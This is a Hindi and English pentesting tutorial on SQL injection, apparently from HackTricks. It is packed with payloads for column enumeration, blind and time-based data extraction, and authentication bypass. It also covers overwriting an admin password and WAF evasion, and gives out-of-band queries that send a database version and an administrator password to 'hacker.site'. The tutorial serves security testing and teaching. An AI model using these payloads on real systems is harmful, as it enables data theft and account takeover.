# SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## SQL इंजेक्शन क्या है?

एक **SQL इंजेक्शन** एक सुरक्षा दोष है जो हमलावरों को एक एप्लिकेशन के **डेटाबेस क्वेरीज़ में हस्तक्षेप** करने की अनुमति देता है। यह भेद्यता हमलावरों को **देखने**, **संशोधित करने** या **हटाने** की अनुमति दे सकती है, जो उन्हें एक्सेस नहीं करना चाहिए, जिसमें अन्य उपयोगकर्ताओं की जानकारी या कोई भी डेटा शामिल है जिसे एप्लिकेशन एक्सेस कर सकता है। ऐसे कार्य एप्लिकेशन की कार्यक्षमता या सामग्री में स्थायी परिवर्तन का परिणाम बन सकते हैं या यहां तक कि सर्वर का समझौता या सेवा का इनकार भी कर सकते हैं।

## प्रवेश बिंदु पहचान

जब एक साइट **SQL इंजेक्शन (SQLi)** के लिए **भेद्य** प्रतीत होती है, जो SQLi-संबंधित इनपुट के प्रति असामान्य सर्वर प्रतिक्रियाओं के कारण होती है, तो **पहला कदम** यह समझना है कि **क्वेरी में डेटा को बिना बाधित किए कैसे इंजेक्ट करें**। इसके लिए वर्तमान संदर्भ से **प्रभावी ढंग से बचने** की विधि की पहचान करना आवश्यक है। ये कुछ उपयोगी उदाहरण हैं:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
फिर, आपको यह जानने की आवश्यकता है कि **क्वेरी को कैसे ठीक करें ताकि कोई त्रुटियाँ न हों**। क्वेरी को ठीक करने के लिए, आप **डेटा इनपुट** कर सकते हैं ताकि **पिछली क्वेरी नए डेटा को स्वीकार कर सके**, या आप बस **अपना डेटा इनपुट** कर सकते हैं और **अंत में एक टिप्पणी प्रतीक जोड़ सकते हैं**।

_ध्यान दें कि यदि आप त्रुटि संदेश देख सकते हैं या जब क्वेरी काम कर रही है और जब नहीं, तब आप अंतर देख सकते हैं, तो यह चरण अधिक आसान होगा।_

### **टिप्पणियाँ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirming with logical operations

एक विश्वसनीय विधि SQL injection vulnerability की पुष्टि करने के लिए **logical operation** को निष्पादित करना और अपेक्षित परिणामों का अवलोकन करना शामिल है। उदाहरण के लिए, एक GET पैरामीटर जैसे `?username=Peter` को `?username=Peter' or '1'='1` में संशोधित करने पर समान सामग्री उत्पन्न होना SQL injection vulnerability का संकेत देता है।

इसी तरह, **mathematical operations** का उपयोग एक प्रभावी पुष्टि तकनीक के रूप में किया जाता है। उदाहरण के लिए, यदि `?id=1` और `?id=2-1` तक पहुँचने पर समान परिणाम उत्पन्न होते हैं, तो यह SQL injection का संकेत है।

Examples demonstrating logical operation confirmation:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
यह शब्द-सूची **SQLinjections** की पुष्टि करने के लिए प्रस्तावित तरीके से बनाई गई थी:

{{#file}}
sqli-logic.txt
{{#endfile}}

### समय के साथ पुष्टि करना

कुछ मामलों में, आप परीक्षण कर रहे पृष्ठ पर **कोई परिवर्तन नहीं देखेंगे**। इसलिए, **ब्लाइंड SQL injections** का पता लगाने का एक अच्छा तरीका है कि DB को क्रियाएँ करने के लिए मजबूर करना और इससे पृष्ठ के लोड होने के समय पर **प्रभाव** पड़ेगा।\
इसलिए, हम SQL क्वेरी में एक ऐसा ऑपरेशन जोड़ने जा रहे हैं जो पूरा होने में बहुत समय लेगा:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
कुछ मामलों में **sleep functions की अनुमति नहीं होगी**। फिर, उन फ़ंक्शनों का उपयोग करने के बजाय, आप क्वेरी को **जटिल ऑपरेशंस** करने के लिए बना सकते हैं जो कई सेकंड लेगी। _इन तकनीकों के उदाहरण प्रत्येक तकनीक पर अलग से टिप्पणी की जाएगी (यदि कोई हो)_।

### बैक-एंड की पहचान करना

बैक-एंड की पहचान करने का सबसे अच्छा तरीका विभिन्न बैक-एंड के फ़ंक्शंस को निष्पादित करने की कोशिश करना है। आप पिछले अनुभाग के _**sleep**_ **functions** या इनका उपयोग कर सकते हैं (तालिका [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Also, if you have access to the output of the query, you could make it **print the version of the database**.

> [!NOTE]
> एक निरंतरता है जिसमें हम विभिन्न प्रकार के SQL Injection का शोषण करने के लिए विभिन्न विधियों पर चर्चा करने जा रहे हैं। हम उदाहरण के रूप में MySQL का उपयोग करेंगे।

### Identifying with PortSwigger

{{#ref}}
https://portswigger.net/web-security/sql-injection/cheat-sheet
{{#endref}}

## Exploiting Union Based

### Detecting number of columns

If you can see the output of the query this is the best way to exploit it.\
First of all, हमें यह पता लगाना है कि **प्रारंभिक अनुरोध** कितने **स्तंभ** वापस कर रहा है। इसका कारण यह है कि **दोनों प्रश्नों को समान संख्या में स्तंभ लौटाना चाहिए**।\
इस उद्देश्य के लिए आमतौर पर दो विधियों का उपयोग किया जाता है:

#### Order/Group by

To determine the number of columns in a query, incrementally adjust the number used in **ORDER BY** or **GROUP BY** clauses until a false response is received. Despite the distinct functionalities of **GROUP BY** and **ORDER BY** within SQL, both can be utilized identically for ascertaining the query's column count.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

जांच करें कि क्वेरी सही है, इसके लिए अधिक से अधिक नल मान चुनें:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_आपको `null` मानों का उपयोग करना चाहिए क्योंकि कुछ मामलों में क्वेरी के दोनों पक्षों के कॉलम का प्रकार समान होना चाहिए और null हर मामले में मान्य है।_

### डेटाबेस नाम, तालिका नाम और कॉलम नाम निकालें

अगले उदाहरणों में हम सभी डेटाबेस के नाम, एक डेटाबेस की तालिका का नाम, तालिका के कॉलम नाम निकालने जा रहे हैं:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_हर अलग-अलग डेटाबेस पर इस डेटा को खोजने का एक अलग तरीका है, लेकिन यह हमेशा वही पद्धति होती है।_

## छिपे हुए यूनियन आधारित का शोषण

जब एक क्वेरी का आउटपुट दिखाई देता है, लेकिन यूनियन-आधारित इंजेक्शन असंभव लगता है, तो यह **छिपे हुए यूनियन-आधारित इंजेक्शन** की उपस्थिति का संकेत देता है। यह स्थिति अक्सर एक ब्लाइंड इंजेक्शन स्थिति की ओर ले जाती है। एक ब्लाइंड इंजेक्शन को यूनियन-आधारित में बदलने के लिए, बैकएंड पर निष्पादन क्वेरी को पहचानना आवश्यक है।

यह आपके लक्षित डेटाबेस प्रबंधन प्रणाली (DBMS) के लिए विशिष्ट डिफ़ॉल्ट तालिकाओं के साथ ब्लाइंड इंजेक्शन तकनीकों का उपयोग करके किया जा सकता है। इन डिफ़ॉल्ट तालिकाओं को समझने के लिए, लक्षित DBMS की दस्तावेज़ीकरण की सलाह दी जाती है।

एक बार जब क्वेरी निकाली जाती है, तो आपके पेलोड को मूल क्वेरी को सुरक्षित रूप से बंद करने के लिए अनुकूलित करना आवश्यक है। इसके बाद, आपके पेलोड में एक यूनियन क्वेरी जोड़ी जाती है, जो नए सुलभ यूनियन-आधारित इंजेक्शन के शोषण की सुविधा प्रदान करती है।

अधिक व्यापक अंतर्दृष्टि के लिए, [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f) पर उपलब्ध पूर्ण लेख को देखें।

## त्रुटि आधारित का शोषण

यदि किसी कारणवश आप **क्वेरी** का **आउटपुट** नहीं देख सकते हैं लेकिन आप **त्रुटि संदेश** देख सकते हैं, तो आप इन त्रुटि संदेशों का उपयोग करके डेटाबेस से डेटा को **एक्स-फिल्ट्रेट** कर सकते हैं।\
यूनियन आधारित शोषण में समान प्रवाह का पालन करते हुए, आप DB को डंप करने में सक्षम हो सकते हैं।
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploiting Blind SQLi

इस मामले में आप क्वेरी के परिणाम या त्रुटियों को नहीं देख सकते, लेकिन आप **distinguished** कर सकते हैं जब क्वेरी **return** एक **true** या **false** प्रतिक्रिया क्योंकि पृष्ठ पर विभिन्न सामग्री होती है।\
इस मामले में, आप उस व्यवहार का दुरुपयोग करके डेटाबेस को अक्षर दर अक्षर डंप कर सकते हैं:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploiting Error Blind SQLi

यह **पहले के मामले की तरह ही है** लेकिन क्वेरी से सही/गलत प्रतिक्रिया के बीच भेद करने के बजाय आप **भेद कर सकते हैं** कि SQL क्वेरी में **त्रुटि** है या नहीं (शायद क्योंकि HTTP सर्वर क्रैश हो जाता है)। इसलिए, इस मामले में आप हर बार SQL त्रुटि को मजबूर कर सकते हैं जब आप सही अक्षर का अनुमान लगाते हैं:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploiting Time Based SQLi

इस मामले में **कोई** तरीका **नहीं** है **जिससे** आप पृष्ठ के संदर्भ के आधार पर क्वेरी के **प्रतिक्रिया** को **पहचान** सकें। लेकिन, यदि अनुमानित वर्ण सही है तो आप पृष्ठ को **लोड होने में अधिक समय** ले जाने के लिए बना सकते हैं। हमने पहले इस तकनीक का उपयोग [SQLi vuln की पुष्टि करने के लिए](#confirming-with-timing) देखा है।
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

आप स्टैक्ड क्वेरीज़ का उपयोग करके **एक के बाद एक कई क्वेरीज़ को निष्पादित** कर सकते हैं। ध्यान दें कि जबकि बाद की क्वेरीज़ निष्पादित होती हैं, **परिणाम** **ऐप्लिकेशन को वापस नहीं किए जाते**। इसलिए यह तकनीक मुख्य रूप से **ब्लाइंड कमजोरियों** के संबंध में उपयोगी है जहाँ आप एक दूसरी क्वेरी का उपयोग करके DNS लुकअप, शर्तीय त्रुटि, या समय विलंब को ट्रिगर कर सकते हैं।

**Oracle** **स्टैक्ड क्वेरीज़** का समर्थन नहीं करता। **MySQL, Microsoft** और **PostgreSQL** उनका समर्थन करते हैं: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

यदि **कोई अन्य** शोषण विधि **काम नहीं करती**, तो आप **डेटाबेस को** जानकारी को आपके द्वारा नियंत्रित **बाहरी होस्ट** पर निकालने के लिए प्रयास कर सकते हैं। उदाहरण के लिए, DNS क्वेरीज़ के माध्यम से:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Out of band डेटा एक्सफिल्ट्रेशन XXE के माध्यम से
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automated Exploitation

Check the [SQLMap Cheatsheet](sqlmap/index.html) to exploit a SQLi vulnerability with [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Tech specific info

हम पहले ही SQL Injection vulnerability को exploit करने के सभी तरीकों पर चर्चा कर चुके हैं। इस पुस्तक में कुछ और तकनीकें जो डेटाबेस प्रौद्योगिकी पर निर्भर हैं, खोजें:

- [MS Access](ms-access-sql-injection.md)
- [MSSQL](mssql-injection.md)
- [MySQL](mysql-injection/index.html)
- [Oracle](oracle-injection.md)
- [PostgreSQL](postgresql-injection/index.html)

या आप **MySQL, PostgreSQL, Oracle, MSSQL, SQLite और HQL के बारे में बहुत सारी तकनीकें** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) में पाएंगे।

## Authentication bypass

List to try to bypass the login functionality:

{{#ref}}
../login-bypass/sql-login-bypass.md
{{#endref}}

### Raw hash authentication Bypass
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
यह क्वेरी एक कमजोरियों को प्रदर्शित करती है जब MD5 को प्रमाणीकरण जांचों में कच्चे आउटपुट के लिए true के साथ उपयोग किया जाता है, जिससे सिस्टम SQL injection के प्रति संवेदनशील हो जाता है। हमलावर इसको इस तरह से भुनाने में सक्षम होते हैं कि वे ऐसे इनपुट तैयार करते हैं जो, जब हैश किए जाते हैं, अप्रत्याशित SQL कमांड भाग उत्पन्न करते हैं, जिससे अनधिकृत पहुंच होती है।
```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```
### Injected hash authentication Bypass
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**सिफारिश की गई सूची**:

आपको सूची की प्रत्येक पंक्ति को उपयोगकर्ता नाम के रूप में और हमेशा पासवर्ड के रूप में उपयोग करना चाहिए: _**Pass1234.**_\
_(ये पेलोड भी इस अनुभाग की शुरुआत में उल्लेखित बड़ी सूची में शामिल हैं)_

{{#file}}
sqli-hashbypass.txt
{{#endfile}}

### GBK प्रमाणीकरण बायपास

यदि ' को स्केप किया जा रहा है तो आप %A8%27 का उपयोग कर सकते हैं, और जब ' को स्केप किया जाता है तो यह बनेगा: 0xA80x5c0x27 (_╘'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python स्क्रिप्ट:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Polyglot injection (multicontext)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Modify password of existing object/user

To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:

- Create user named: **AdMIn** (uppercase & lowercase letters)
- Create a user named: **admin=**
- **SQL Truncation Attack** (when there is some kind of **length limit** in the username or email) --> Create user with name: **admin \[a lot of spaces] a**

#### SQL Truncation Attack

If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 spaces] a_" and any password.

The database will **check** if the introduced **username** **exists** inside the database. If **not**, it will **cut** the **username** to the **max allowed number of characters** (in this case to: "_admin \[25 spaces]_") and the it will **automatically remove all the spaces at the end updating** inside the database the user "**admin**" with the **new password** (some error could appear but it doesn't means that this hasn't worked).

More info: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check:_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)

### MySQL Insert time based checking

Add as much `','',''` as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

The `ON DUPLICATE KEY UPDATE` क्लॉज़ MySQL में उपयोग किया जाता है ताकि डेटाबेस के लिए उन क्रियाओं को निर्दिष्ट किया जा सके जो तब की जाएंगी जब एक पंक्ति को सम्मिलित करने का प्रयास किया जाता है जो UNIQUE इंडेक्स या PRIMARY KEY में डुप्लिकेट मान का परिणाम देगा। निम्नलिखित उदाहरण दर्शाता है कि इस सुविधा का उपयोग कैसे किया जा सकता है ताकि एक व्यवस्थापक खाते का पासवर्ड संशोधित किया जा सके:

Example Payload Injection:

An injection payload might be crafted as follows, where two rows are attempted to be inserted into the `users` table. The first row is a decoy, and the second row targets an existing administrator's email with the intention of updating the password:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
यहाँ यह कैसे काम करता है:

- क्वेरी दो पंक्तियाँ डालने का प्रयास करती है: एक `generic_user@example.com` के लिए और दूसरी `admin_generic@example.com` के लिए।
- यदि `admin_generic@example.com` के लिए पंक्ति पहले से मौजूद है, तो `ON DUPLICATE KEY UPDATE` क्लॉज सक्रिय होता है, जो MySQL को मौजूदा पंक्ति के `password` फ़ील्ड को "bcrypt_hash_of_newpassword" में अपडेट करने का निर्देश देता है।
- इसके परिणामस्वरूप, प्रमाणीकरण `admin_generic@example.com` का उपयोग करके उस पासवर्ड के साथ किया जा सकता है जो bcrypt हैश से मेल खाता है ("bcrypt_hash_of_newpassword" नए पासवर्ड के bcrypt हैश का प्रतिनिधित्व करता है, जिसे इच्छित पासवर्ड के वास्तविक हैश से बदलना चाहिए)।

### जानकारी निकालें

#### एक ही समय में 2 खाते बनाना

जब एक नया उपयोगकर्ता और उपयोगकर्ता नाम बनाने का प्रयास किया जाता है, तो पासवर्ड और ईमेल की आवश्यकता होती है:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### दशमलव या हेक्साडेसिमल का उपयोग करना

इस तकनीक का उपयोग करके आप केवल 1 खाता बनाकर जानकारी निकाल सकते हैं। यह ध्यान रखना महत्वपूर्ण है कि आपको कुछ भी टिप्पणी करने की आवश्यकता नहीं है।

**hex2dec** और **substr** का उपयोग करते हुए:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
टेक्स्ट प्राप्त करने के लिए आप उपयोग कर सकते हैं:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**हैक्स** और **रिप्लेस** (और **सब्स्ट्र**) का उपयोग करते हुए:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
## Routed SQL injection

Routed SQL injection एक ऐसी स्थिति है जहाँ injectable query वह नहीं होती जो आउटपुट देती है, बल्कि injectable query का आउटपुट उस query में जाता है जो आउटपुट देती है। ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[Initial bypasses from here](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### No spaces bypass

No Space (%20) - whitespace विकल्पों का उपयोग करके बायपास
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
कोई व्हाइटस्पेस नहीं - टिप्पणियों का उपयोग करके बायपास
```sql
?id=1/*comment*/and/**/1=1/**/--
```
कोई व्हाइटस्पेस - पेरेंटेसिस का उपयोग करके बायपास
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - OFFSET, FROM और JOIN का उपयोग करके बायपास
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

कीवर्ड का उपयोग करके ब्लैकलिस्ट - अपरकेस/लोअरकेस का उपयोग करके बायपास
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
कीवर्ड का उपयोग करके ब्लैकलिस्ट - समकक्ष ऑपरेटर का उपयोग करके बायपास करें
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Scientific Notation WAF bypass

आप इस ट्रिक के बारे में अधिक गहन व्याख्या [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) में पा सकते हैं।\
बुनियादी रूप से, आप WAF को बायपास करने के लिए वैज्ञानिक संकेतन का अप्रत्याशित तरीकों से उपयोग कर सकते हैं:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### कॉलम नामों की सीमा को बायपास करें

सबसे पहले, ध्यान दें कि यदि **मूल क्वेरी और वह तालिका जहाँ से आप ध्वज निकालना चाहते हैं, में समान संख्या में कॉलम हैं** तो आप बस कर सकते हैं: `0 UNION SELECT * FROM flag`

यह संभव है कि **किसी तालिका के तीसरे कॉलम तक उसके नाम का उपयोग किए बिना पहुंचा जाए** एक क्वेरी का उपयोग करके जैसे: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, तो एक sqlinjection में यह इस तरह दिखेगा:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
या **कमा बायपास** का उपयोग करके:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
यह ट्रिक [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) से ली गई थी।

### WAF बायपास सुझाव उपकरण

{{#ref}}
https://github.com/m4ll0k/Atlas
{{#endref}}

## अन्य गाइड

- [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## ब्रूट-फोर्स डिटेक्शन सूची

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt
{{#endref}}

​
{{#include ../../banners/hacktricks-training.md}}
